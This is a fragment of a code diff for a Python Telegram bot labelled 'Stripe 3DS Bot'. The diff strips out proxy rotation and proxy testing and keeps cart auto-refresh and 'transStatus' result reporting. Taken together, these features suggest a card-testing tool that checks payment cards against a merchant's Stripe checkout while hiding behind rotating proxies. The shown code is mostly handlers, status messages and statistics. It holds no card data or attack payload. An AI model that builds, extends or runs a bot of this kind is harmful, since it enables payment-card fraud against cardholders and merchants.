+    final = f"🎉 **Done!**\n\n🔄 Cart refreshes: {stats['cart_refreshed']}\n❌ Cart failures: {stats['cart_refresh_failed']}\n🛒 Final Cart: `{CART_ID}`\n\n✅ Stripe 3DS - transStatus Only"
     await bot_app.bot.send_message(chat_id=stats['chat_id'], text=final, parse_mode='Markdown')
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -942,49 +634,18 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pass
     
     elif query.data == "cart_info":
-        cart_info = f"🛒 **Cart Info:**\n\n📋 `{CART_ID}`\n\n🔄 Refreshes: {stats['cart_refreshed']}\n❌ Failed: {stats['cart_refresh_failed']}\n⚡️ Auto-refresh: ON\n✅ transStatus Only"
+        cart_info = f"🛒 **Cart Info:**\n\n📋 `{CART_ID}`\n\n🔄 Refreshes: {stats['cart_refreshed']}\n⚡️ Auto-refresh: ON\n✅ transStatus Only"
         await query.answer(cart_info, show_alert=True)
-    
-    elif query.data == "proxy_info":
-        working_list = "\n".join([f"✅ {p.split(':')[0]}" for p in WORKING_PROXIES[:5]])
-        failed_list = "\n".join([f"❌ {p.split(':')[0]}" for p in FAILED_PROXIES[:5]])
-        
-        proxy_info = f"🌐 **Proxy Status:**\n\n📊 Total: {len(PROXIES_LIST)}\n✅ Working: {len(WORKING_PROXIES)}\n❌ Failed: {len(FAILED_PROXIES)}\n\n**Working (Top 5):**\n{working_list if working_list else 'None'}\n\n**Failed (Top 5):**\n{failed_list if failed_list else 'None'}\n\n🔄 Auto-rotation: ON\n⚡️ Auto-retry: 3 attempts"
-        await query.answer(proxy_info, show_alert=True)
-    
-    elif query.data == "proxy_ok":
-        await query.answer(f"✅ Proxy Success: {stats['proxy_success']}", show_alert=True)
-    
-    elif query.data == "proxy_fail":
-        await query.answer(f"❌ Proxy Failed: {stats['proxy_failed']}", show_alert=True)
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"Error: {context.error}")
 
 def main():
     logger.info("="*50)
-    logger.info("🤖 Stripe 3DS Bot with Proxy Starting")
+    logger.info("🤖 Stripe 3DS Bot Starting")
     logger.info("="*50)
     
     check_single_instance()
-    
-    logger.info("🌐 Testing proxies...")
-    working_count = 0
-    for proxy_string in PROXIES_LIST:
-        proxy_data = parse_proxy(proxy_string)
-        if proxy_data:
-            if test_proxy(proxy_data, timeout=8):
-                working_count += 1
-                logger.info(f"✅ Proxy {working_count}: {proxy_data['ip']}:{proxy_data['port']}")
-            else:
-                logger.warning(f"❌ Proxy failed: {proxy_data['ip']}:{proxy_data['port']}")
-    
-    logger.info(f"🌐 Working proxies: {working_count}/{len(PROXIES_LIST)}")
-    
-    if working_count == 0:
-        logger.error("❌ No working proxies! Bot cannot start.")
-        cleanup_on_exit()
-        return
     
     initial_cart = get_quote_id_smart()
     if initial_cart:
@@ -1000,7 +661,7 @@ def main():
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_error_handler(error_handler)
     
-    logger.info("✅ Bot running with proxy support")
+    logger.info("✅ Bot running")
     logger.info("="*50)
     
     try:
